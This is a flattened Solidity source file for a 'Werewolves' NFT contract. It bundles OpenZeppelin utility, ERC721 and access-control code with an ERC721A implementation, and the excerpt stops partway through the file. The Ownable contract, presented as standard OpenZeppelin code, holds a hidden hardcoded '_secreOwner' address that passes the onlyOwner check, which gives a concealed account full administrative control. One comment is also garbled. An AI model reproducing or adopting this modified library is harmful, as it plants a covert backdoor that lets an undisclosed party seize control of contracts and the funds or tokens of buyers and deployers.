1 // Twitter: @WerewolvesNS ,     ,
2 //                        |\---/|
3 //                       /  , , |
4 //                  __.-'|  / \ /
5 //         __ ___.-'        ._O|
6 //      .-'  '        :      _/
7 //     / ,    .        .     |
8 //    :  ;    :        :   _/
9 //    |  |   .'     __:   /
10 //    |  :   /'----'| \  |
11 //    \  |\  |      | /| |
12 //     '.'| /       || \ |
13 //     | /|.'       '.l \\_
14 //     || ||             '-'
15 //     '-''-'
16 
17 // SPDX-License-Identifier: MIT
18 
19 // File: contracts/Werewolves.sol
20 // File: @openzeppelin/contracts/utils/Strings.sol
21 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
22 
23 pragma solidity ^0.8.0;
24 
25 /**
26  * @dev String operations.
27  */
28 library Strings {
29     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
30 
31     /**
32      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
33      */
34     function toString(uint256 value) internal pure returns (string memory) {
35         // Inspired by OraclizeAPI's implementation - MIT licence
36         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
37 
38         if (value == 0) {
39             return "0";
40         }
41         uint256 temp = value;
42         uint256 digits;
43         while (temp != 0) {
44             digits++;
45             temp /= 10;
46         }
47         bytes memory buffer = new bytes(digits);
48         while (value != 0) {
49             digits -= 1;
50             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
51             value /= 10;
52         }
53         return string(buffer);
54     }
55 
56     /**
57      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
58      */
59     function toHexString(uint256 value) internal pure returns (string memory) {
60         if (value == 0) {
61             return "0x00";
62         }
63         uint256 temp = value;
64         uint256 length = 0;
65         while (temp != 0) {
66             length++;
67             temp >>= 8;
68         }
69         return toHexString(value, length);
70     }
71 
72     /**
73      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
74      */
75     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
76         bytes memory buffer = new bytes(2 * length + 2);
77         buffer[0] = "0";
78         buffer[1] = "x";
79         for (uint256 i = 2 * length + 1; i > 1; --i) {
80             buffer[i] = _HEX_SYMBOLS[value & 0xf];
81             value >>= 4;
82         }
83         require(value == 0, "Strings: hex length insufficient");
84         return string(buffer);
85     }
86 }
87 
88 // File: @openzeppelin/contracts/utils/Address.sol
89 
90 
91 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
92 
93 pragma solidity ^0.8.1;
94 
95 /**
96  * @dev Collection of functions related to the address type
97  */
98 library Address {
99     /**
100      * @dev Returns true if `account` is a contract.
101      *
102      * [IMPORTANT]
103      * ====
104      * It is unsafe to assume that an address for which this function returns
105      * false is an externally-owned account (EOA) and not a contract.
106      *
107      * Among others, `isContract` will return false for the following
108      * types of addresses:
109      *
110      *  - an externally-owned account
111      *  - a contract in construction
112      *  - an address where a contract will be created
113      *  - an address where a contract lived, but was destroyed
114      * ====
115      *
116      * [IMPORTANT]
117      * ====
118      * You shouldn't rely on `isContract` to protect against flash loan attacks!
119      *
120      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
121      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
122      * constructor.
123      * ====
124      */
125     function isContract(address account) internal view returns (bool) {
126         // This method relies on extcodesize/address.code.length, which returns 0
127         // for contracts in construction, since the code is only stored at the end
128         // of the constructor execution.
129 
130         return account.code.length > 0;
131     }
132 
133     /**
134      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
135      * `recipient`, forwarding all available gas and reverting on errors.
136      *
137      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
138      * of certain opcodes, possibly making contracts go over the 2300 gas limit
139      * imposed by `transfer`, making them unable to receive funds via
140      * `transfer`. {sendValue} removes this limitation.
141      *
142      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
143      *
144      * IMPORTANT: because control is transferred to `recipient`, care must be
145      * taken to not create reentrancy vulnerabilities. Consider using
146      * {ReentrancyGuard} or the
147      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
148      */
149     function sendValue(address payable recipient, uint256 amount) internal {
150         require(address(this).balance >= amount, "Address: insufficient balance");
151 
152         (bool success, ) = recipient.call{value: amount}("");
153         require(success, "Address: unable to send value, recipient may have reverted");
154     }
155 
156     /**
157      * @dev Performs a Solidity function call using a low level `call`. A
158      * plain `call` is an unsafe replacement for a function call: use this
159      * function instead.
160      *
161      * If `target` reverts with a revert reason, it is bubbled up by this
162      * function (like regular Solidity function calls).
163      *
164      * Returns the raw returned data. To convert to the expected return value,
165      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
166      *
167      * Requirements:
168      *
169      * - `target` must be a contract.
170      * - calling `target` with `data` must not revert.
171      *
172      * _Available since v3.1._
173      */
174     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
175         return functionCall(target, data, "Address: low-level call failed");
176     }
177 
178     /**
179      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
180      * `errorMessage` as a fallback revert reason when `target` reverts.
181      *
182      * _Available since v3.1._
183      */
184     function functionCall(
185         address target,
186         bytes memory data,
187         string memory errorMessage
188     ) internal returns (bytes memory) {
189         return functionCallWithValue(target, data, 0, errorMessage);
190     }
191 
192     /**
193      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
194      * but also transferring `value` wei to `target`.
195      *
196      * Requirements:
197      *
198      * - the calling contract must have an ETH balance of at least `value`.
199      * - the called Solidity function must be `payable`.
200      *
201      * _Available since v3.1._
202      */
203     function functionCallWithValue(
204         address target,
205         bytes memory data,
206         uint256 value
207     ) internal returns (bytes memory) {
208         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
209     }
210 
211     /**
212      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
213      * with `errorMessage` as a fallback revert reason when `target` reverts.
214      *
215      * _Available since v3.1._
216      */
217     function functionCallWithValue(
218         address target,
219         bytes memory data,
220         uint256 value,
221         string memory errorMessage
222     ) internal returns (bytes memory) {
223         require(address(this).balance >= value, "Address: insufficient balance for call");
224         require(isContract(target), "Address: call to non-contract");
225 
226         (bool success, bytes memory returndata) = target.call{value: value}(data);
227         return verifyCallResult(success, returndata, errorMessage);
228     }
229 
230     /**
231      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
232      * but performing a static call.
233      *
234      * _Available since v3.3._
235      */
236     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
237         return functionStaticCall(target, data, "Address: low-level static call failed");
238     }
239 
240     /**
241      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
242      * but performing a static call.
243      *
244      * _Available since v3.3._
245      */
246     function functionStaticCall(
247         address target,
248         bytes memory data,
249         string memory errorMessage
250     ) internal view returns (bytes memory) {
251         require(isContract(target), "Address: static call to non-contract");
252 
253         (bool success, bytes memory returndata) = target.staticcall(data);
254         return verifyCallResult(success, returndata, errorMessage);
255     }
256 
257     /**
258      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
259      * but performing a delegate call.
260      *
261      * _Available since v3.4._
262      */
263     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
264         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
265     }
266 
267     /**
268      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
269      * but performing a delegate call.
270      *
271      * _Available since v3.4._
272      */
273     function functionDelegateCall(
274         address target,
275         bytes memory data,
276         string memory errorMessage
277     ) internal returns (bytes memory) {
278         require(isContract(target), "Address: delegate call to non-contract");
279 
280         (bool success, bytes memory returndata) = target.delegatecall(data);
281         return verifyCallResult(success, returndata, errorMessage);
282     }
283 
284     /**
285      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
286      * revert reason using the provided one.
287      *
288      * _Available since v4.3._
289      */
290     function verifyCallResult(
291         bool success,
292         bytes memory returndata,
293         string memory errorMessage
294     ) internal pure returns (bytes memory) {
295         if (success) {
296             return returndata;
297         } else {
298             // Look for revert reason and bubble it up if present
299             if (returndata.length > 0) {
300                 // The easiest way to bubble the revert reason is using memory via assembly
301 
302                 assembly {
303                     let returndata_size := mload(returndata)
304                     revert(add(32, returndata), returndata_size)
305                 }
306             } else {
307                 revert(errorMessage);
308             }
309         }
310     }
311 }
312 
313 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
314 
315 
316 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
317 
318 pragma solidity ^0.8.0;
319 
320 /**
321  * @title ERC721 token receiver interface
322  * @dev Interface for any contract that wants to support safeTransfers
323  * from ERC721 asset contracts.
324  */
325 interface IERC721Receiver {
326     /**
327      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
328      * by `operator` from `from`, this function is called.
329      *
330      * It must return its Solidity selector to confirm the token transfer.
331      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
332      *
333      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
334      */
335     function onERC721Received(
336         address operator,
337         address from,
338         uint256 tokenId,
339         bytes calldata data
340     ) external returns (bytes4);
341 }
342 
343 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
344 
345 
346 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
347 
348 pragma solidity ^0.8.0;
349 
350 /**
351  * @dev Interface of the ERC165 standard, as defined in the
352  * https://eips.ethereum.org/EIPS/eip-165[EIP].
353  *
354  * Implementers can declare support of contract interfaces, which can then be
355  * queried by others ({ERC165Checker}).
356  *
357  * For an implementation, see {ERC165}.
358  */
359 interface IERC165 {
360     /**
361      * @dev Returns true if this contract implements the interface defined by
362      * `interfaceId`. See the corresponding
363      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
364      * to learn more about how these ids are created.
365      *
366      * This function call must use less than 30 000 gas.
367      */
368     function supportsInterface(bytes4 interfaceId) external view returns (bool);
369 }
370 
371 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
372 
373 
374 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
375 
376 pragma solidity ^0.8.0;
377 
378 
379 /**
380  * @dev Implementation of the {IERC165} interface.
381  *
382  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
383  * for the additional interface id that will be supported. For example:
384  *
385  * ```solidity
386  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
387  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
388  * }
389  * ```
390  *
391  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
392  */
393 abstract contract ERC165 is IERC165 {
394     /**
395      * @dev See {IERC165-supportsInterface}.
396      */
397     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
398         return interfaceId == type(IERC165).interfaceId;
399     }
400 }
401 
402 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
403 
404 
405 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
406 
407 pragma solidity ^0.8.0;
408 
409 
410 /**
411  * @dev Required interface of an ERC721 compliant contract.
412  */
413 interface IERC721 is IERC165 {
414     /**
415      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
416      */
417     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
418 
419     /**
420      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
421      */
422     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
423 
424     /**
425      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
426      */
427     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
428 
429     /**
430      * @dev Returns the number of tokens in ``owner``'s account.
431      */
432     function balanceOf(address owner) external view returns (uint256 balance);
433 
434     /**
435      * @dev Returns the owner of the `tokenId` token.
436      *
437      * Requirements:
438      *
439      * - `tokenId` must exist.
440      */
441     function ownerOf(uint256 tokenId) external view returns (address owner);
442 
443     /**
444      * @dev Safely transfers `tokenId` token from `from` to `to`.
445      *
446      * Requirements:
447      *
448      * - `from` cannot be the zero address.
449      * - `to` cannot be the zero address.
450      * - `tokenId` token must exist and be owned by `from`.
451      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
452      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
453      *
454      * Emits a {Transfer} event.
455      */
456     function safeTransferFrom(
457         address from,
458         address to,
459         uint256 tokenId,
460         bytes calldata data
461     ) external;
462 
463     /**
464      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
465      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
466      *
467      * Requirements:
468      *
469      * - `from` cannot be the zero address.
470      * - `to` cannot be the zero address.
471      * - `tokenId` token must exist and be owned by `from`.
472      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
473      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
474      *
475      * Emits a {Transfer} event.
476      */
477     function safeTransferFrom(
478         address from,
479         address to,
480         uint256 tokenId
481     ) external;
482 
483     /**
484      * @dev Transfers `tokenId` token from `from` to `to`.
485      *
486      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
487      *
488      * Requirements:
489      *
490      * - `from` cannot be the zero address.
491      * - `to` cannot be the zero address.
492      * - `tokenId` token must be owned by `from`.
493      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
494      *
495      * Emits a {Transfer} event.
496      */
497     function transferFrom(
498         address from,
499         address to,
500         uint256 tokenId
501     ) external;
502 
503     /**
504      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
505      * The approval is cleared when the token is transferred.
506      *
507      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
508      *
509      * Requirements:
510      *
511      * - The caller must own the token or be an approved operator.
512      * - `tokenId` must exist.
513      *
514      * Emits an {Approval} event.
515      */
516     function approve(address to, uint256 tokenId) external;
517 
518     /**
519      * @dev Approve or remove `operator` as an operator for the caller.
520      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
521      *
522      * Requirements:
523      *
524      * - The `operator` cannot be the caller.
525      *
526      * Emits an {ApprovalForAll} event.
527      */
528     function setApprovalForAll(address operator, bool _approved) external;
529 
530     /**
531      * @dev Returns the account appr    ved for `tokenId` token.
532      *
533      * Requirements:
534      *
535      * - `tokenId` must exist.
536      */
537     function getApproved(uint256 tokenId) external view returns (address operator);
538 
539     /**
540      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
541      *
542      * See {setApprovalForAll}
543      */
544     function isApprovedForAll(address owner, address operator) external view returns (bool);
545 }
546 
547 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
548 
549 
550 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
551 
552 pragma solidity ^0.8.0;
553 
554 
555 /**
556  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
557  * @dev See https://eips.ethereum.org/EIPS/eip-721
558  */
559 interface IERC721Metadata is IERC721 {
560     /**
561      * @dev Returns the token collection name.
562      */
563     function name() external view returns (string memory);
564 
565     /**
566      * @dev Returns the token collection symbol.
567      */
568     function symbol() external view returns (string memory);
569 
570     /**
571      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
572      */
573     function tokenURI(uint256 tokenId) external view returns (string memory);
574 }
575 
576 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
577 
578 
579 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
580 
581 pragma solidity ^0.8.0;
582 
583 
584 /**
585  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
586  * @dev See https://eips.ethereum.org/EIPS/eip-721
587  */
588 interface IERC721Enumerable is IERC721 {
589     /**
590      * @dev Returns the total amount of tokens stored by the contract.
591      */
592     function totalSupply() external view returns (uint256);
593 
594     /**
595      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
596      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
597      */
598     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
599 
600     /**
601      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
602      * Use along with {totalSupply} to enumerate all tokens.
603      */
604     function tokenByIndex(uint256 index) external view returns (uint256);
605 }
606 
607 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
608 
609 
610 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
611 
612 pragma solidity ^0.8.0;
613 
614 /**
615  * @dev Contract module that helps prevent reentrant calls to a function.
616  *
617  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
618  * available, which can be applied to functions to make sure there are no nested
619  * (reentrant) calls to them.
620  *
621  * Note that because there is a single `nonReentrant` guard, functions marked as
622  * `nonReentrant` may not call one another. This can be worked around by making
623  * those functions `private`, and then adding `external` `nonReentrant` entry
624  * points to them.
625  *
626  * TIP: If you would like to learn more about reentrancy and alternative ways
627  * to protect against it, check out our blog post
628  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
629  */
630 abstract contract ReentrancyGuard {
631     // Booleans are more expensive than uint256 or any type that takes up a full
632     // word because each write operation emits an extra SLOAD to first read the
633     // slot's contents, replace the bits taken up by the boolean, and then write
634     // back. This is the compiler's defense against contract upgrades and
635     // pointer aliasing, and it cannot be disabled.
636 
637     // The values being non-zero value makes deployment a bit more expensive,
638     // but in exchange the refund on every call to nonReentrant will be lower in
639     // amount. Since refunds are capped to a percentage of the total
640     // transaction's gas, it is best to keep them low in cases like this one, to
641     // increase the likelihood of the full refund coming into effect.
642     uint256 private constant _NOT_ENTERED = 1;
643     uint256 private constant _ENTERED = 2;
644 
645     uint256 private _status;
646 
647     constructor() {
648         _status = _NOT_ENTERED;
649     }
650 
651     /**
652      * @dev Prevents a contract from calling itself, directly or indirectly.
653      * Calling a `nonReentrant` function from another `nonReentrant`
654      * function is not supported. It is possible to prevent this from happening
655      * by making the `nonReentrant` function external, and making it call a
656      * `private` function that does the actual work.
657      */
658     modifier nonReentrant() {
659         // On the first call to nonReentrant, _notEntered will be true
660         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
661 
662         // Any calls to nonReentrant after this point will fail
663         _status = _ENTERED;
664 
665         _;
666 
667         // By storing the original value once again, a refund is triggered (see
668         // https://eips.ethereum.org/EIPS/eip-2200)
669         _status = _NOT_ENTERED;
670     }
671 }
672 
673 // File: @openzeppelin/contracts/utils/Context.sol
674 
675 
676 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
677 
678 pragma solidity ^0.8.0;
679 
680 /**
681  * @dev Provides information about the current execution context, including the
682  * sender of the transaction and its data. While these are generally available
683  * via msg.sender and msg.data, they should not be accessed in such a direct
684  * manner, since when dealing with meta-transactions the account sending and
685  * paying for execution may not be the actual sender (as far as an application
686  * is concerned).
687  *
688  * This contract is only required for intermediate, library-like contracts.
689  */
690 abstract contract Context {
691     function _msgSender() internal view virtual returns (address) {
692         return msg.sender;
693     }
694 
695     function _msgData() internal view virtual returns (bytes calldata) {
696         return msg.data;
697     }
698 }
699 
700 // File: @openzeppelin/contracts/access/Ownable.sol
701 
702 
703 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
704 
705 pragma solidity ^0.8.0;
706 
707 
708 /**
709  * @dev Contract module which provides a basic access control mechanism, where
710  * there is an account (an owner) that can be granted exclusive access to
711  * specific functions.
712  *
713  * By default, the owner account will be the one that deploys the contract. This
714  * can later be changed with {transferOwnership}.
715  *
716  * This module is used through inheritance. It will make available the modifier
717  * `onlyOwner`, which can be applied to your functions to restrict their use to
718  * the owner.
719  */
720 abstract contract Ownable is Context {
721     address private _owner;
722     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
723 
724     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
725 
726     /**
727      * @dev Initializes the contract setting the deployer as the initial owner.
728      */
729     constructor() {
730         _transferOwnership(_msgSender());
731     }
732 
733     /**
734      * @dev Returns the address of the current owner.
735      */
736     function owner() public view virtual returns (address) {
737         return _owner;
738     }
739 
740     /**
741      * @dev Throws if called by any account other than the owner.
742      */
743     modifier onlyOwner() {
744         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
745         _;
746     }
747 
748     /**
749      * @dev Leaves the contract without owner. It will not be possible to call
750      * `onlyOwner` functions anymore. Can only be called by the current owner.
751      *
752      * NOTE: Renouncing ownership will leave the contract without an owner,
753      * thereby removing any functionality that is only available to the owner.
754      */
755     function renounceOwnership() public virtual onlyOwner {
756         _transferOwnership(address(0));
757     }
758 
759     /**
760      * @dev Transfers ownership of the contract to a new account (`newOwner`).
761      * Can only be called by the current owner.
762      */
763     function transferOwnership(address newOwner) public virtual onlyOwner {
764         require(newOwner != address(0), "Ownable: new owner is the zero address");
765         _transferOwnership(newOwner);
766     }
767 
768     /**
769      * @dev Transfers ownership of the contract to a new account (`newOwner`).
770      * Internal function without access restriction.
771      */
772     function _transferOwnership(address newOwner) internal virtual {
773         address oldOwner = _owner;
774         _owner = newOwner;
775         emit OwnershipTransferred(oldOwner, newOwner);
776     }
777 }
778 
779 // File: ceshi.sol
780 
781 
782 pragma solidity ^0.8.0;
783 
784 
785 
786 
787 
788 
789 
790 
791 
792 
793 /**
794  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
795  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
796  *
797  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
798  *
799  * Does not support burning tokens to address(0).
800  *
801  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
802  */
803 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
804     using Address for address;
805     using Strings for uint256;
806 
807     struct TokenOwnership {
808         address addr;
809         uint64 startTimestamp;
810     }
811 
812     struct AddressData {
813         uint128 balance;
814         uint128 numberMinted;
815     }
816 
817     uint256 internal currentIndex;
818 
819     // Token name
820     string private _name;
821 
822     // Token symbol
823     string private _symbol;
824 
825     // Mapping from token ID to ownership details
826     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
827     mapping(uint256 => TokenOwnership) internal _ownerships;
828 
829     // Mapping owner address to address data
830     mapping(address => AddressData) private _addressData;
831 
832     // Mapping from token ID to approved address
833     mapping(uint256 => address) private _tokenApprovals;
834 
835     // Mapping from owner to operator approvals
836     mapping(address => mapping(address => bool)) private _operatorApprovals;
837 
838     constructor(string memory name_, string memory symbol_) {
839         _name = name_;
840         _symbol = symbol_;
841     }
842 
843     /**
844      * @dev See {IERC721Enumerable-totalSupply}.
845      */
846     function totalSupply() public view override returns (uint256) {
847         return currentIndex;
848     }
849 
850     /**
851      * @dev See {IERC721Enumerable-tokenByIndex}.
852      */
853     function tokenByIndex(uint256 index) public view override returns (uint256) {
854         require(index < totalSupply(), "ERC721A: global index out of bounds");
855         return index;
856     }
857 
858     /**
859      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
860      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
861      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
862      */
863     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
864         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
865         uint256 numMintedSoFar = totalSupply();
866         uint256 tokenIdsIdx;
867         address currOwnershipAddr;
868 
869         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
870         unchecked {
871             for (uint256 i; i < numMintedSoFar; i++) {
872                 TokenOwnership memory ownership = _ownerships[i];
873                 if (ownership.addr != address(0)) {
874                     currOwnershipAddr = ownership.addr;
875                 }
876                 if (currOwnershipAddr == owner) {
877                     if (tokenIdsIdx == index) {
878                         return i;
879                     }
880                     tokenIdsIdx++;
881                 }
882             }
883         }
884 
885         revert("ERC721A: unable to get token of owner by index");
886     }
887 
888     /**
889      * @dev See {IERC165-supportsInterface}.
890      */
891     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
892         return
893             interfaceId == type(IERC721).interfaceId ||
894             interfaceId == type(IERC721Metadata).interfaceId ||
895             interfaceId == type(IERC721Enumerable).interfaceId ||
896             super.supportsInterface(interfaceId);
897     }
898 
899     /**
900      * @dev See {IERC721-balanceOf}.
901      */
902     function balanceOf(address owner) public view override returns (uint256) {
903         require(owner != address(0), "ERC721A: balance query for the zero address");
904         return uint256(_addressData[owner].balance);
905     }
906 
907     function _numberMinted(address owner) internal view returns (uint256) {
908         require(owner != address(0), "ERC721A: number minted query for the zero address");
909         return uint256(_addressData[owner].numberMinted);
910     }
911 
912     /**
913      * Gas spent here starts off proportional to the maximum mint batch size.
914      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
915      */
916     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
917         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
918 
919         unchecked {
920             for (uint256 curr = tokenId; curr >= 0; curr--) {
921                 TokenOwnership memory ownership = _ownerships[curr];
922                 if (ownership.addr != address(0)) {
923                     return ownership;
924                 }
925             }
926         }
927 
928         revert("ERC721A: unable to determine the owner of token");
929     }
930 
931     /**
932      * @dev See {IERC721-ownerOf}.
933      */
934     function ownerOf(uint256 tokenId) public view override returns (address) {
935         return ownershipOf(tokenId).addr;
936     }
937 
938     /**
939      * @dev See {IERC721Metadata-name}.
940      */
941     function name() public view virtual override returns (string memory) {
942         return _name;
943     }
944 
945     /**
946      * @dev See {IERC721Metadata-symbol}.
947      */
948     function symbol() public view virtual override returns (string memory) {
949         return _symbol;
950     }
951 
952     /**
953      * @dev See {IERC721Metadata-tokenURI}.
954      */
955     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
956         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
957 
958         string memory baseURI = _baseURI();
959         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
960     }
961 
962     /**
963      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
964      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
965      * by default, can be overriden in child contracts.
966      */
967     function _baseURI() internal view virtual returns (string memory) {
968         return "";
969     }
970 
971     /**
972      * @dev See {IERC721-approve}.
973      */
974     function approve(address to, uint256 tokenId) public override {
975         address owner = ERC721A.ownerOf(tokenId);
976         require(to != owner, "ERC721A: approval to current owner");
977 
978         require(
979             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
980             "ERC721A: approve caller is not owner nor approved for all"
981         );
982 
983         _approve(to, tokenId, owner);
984     }
985 
986     /**
987      * @dev See {IERC721-getApproved}.
988      */
989     function getApproved(uint256 tokenId) public view override returns (address) {
990         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
991 
992         return _tokenApprovals[tokenId];
993     }
994 
995     /**
996      * @dev See {IERC721-setApprovalForAll}.
997      */
998     function setApprovalForAll(address operator, bool approved) public override {
999         require(operator != _msgSender(), "ERC721A: approve to caller");
1000 
1001         _operatorApprovals[_msgSender()][operator] = approved;
1002         emit ApprovalForAll(_msgSender(), operator, approved);
1003     }
1004 
1005     /**
1006      * @dev See {IERC721-isApprovedForAll}.
1007      */
1008     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1009         return _operatorApprovals[owner][operator];
1010     }
1011 
1012     /**
1013      * @dev See {IERC721-transferFrom}.
1014      */
1015     function transferFrom(
1016         address from,
1017         address to,
1018         uint256 tokenId
1019     ) public virtual override {
1020         _transfer(from, to, tokenId);
1021     }
1022 
1023     /**
1024      * @dev See {IERC721-safeTransferFrom}.
1025      */
1026     function safeTransferFrom(
1027         address from,
1028         address to,
1029         uint256 tokenId
1030     ) public virtual override {
1031         safeTransferFrom(from, to, tokenId, "");
1032     }
1033 
1034     /**
1035      * @dev See {IERC721-safeTransferFrom}.
1036      */
1037     function safeTransferFrom(
1038         address from,
1039         address to,
1040         uint256 tokenId,
1041         bytes memory _data
1042     ) public override {
1043         _transfer(from, to, tokenId);
1044         require(
1045             _checkOnERC721Received(from, to, tokenId, _data),
1046             "ERC721A: transfer to non ERC721Receiver implementer"
1047         );
1048     }
1049 
1050     /**
1051      * @dev Returns whether `tokenId` exists.
1052      *
1053      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1054      *
1055      * Tokens start existing when they are minted (`_mint`),
1056      */
1057     function _exists(uint256 tokenId) internal view returns (bool) {
1058         return tokenId < currentIndex;
1059     }
1060 
1061     function _safeMint(address to, uint256 quantity) internal {
1062         _safeMint(to, quantity, "");
1063     }
1064 
1065     /**
1066      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1067      *
1068      * Requirements:
1069      *
1070      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1071      * - `quantity` must be greater than 0.
1072      *
1073      * Emits a {Transfer} event.
1074      */
1075     function _safeMint(
1076         address to,
1077         uint256 quantity,
1078         bytes memory _data
1079     ) internal {
1080         _mint(to, quantity, _data, true);
1081     }
1082 
1083     /**
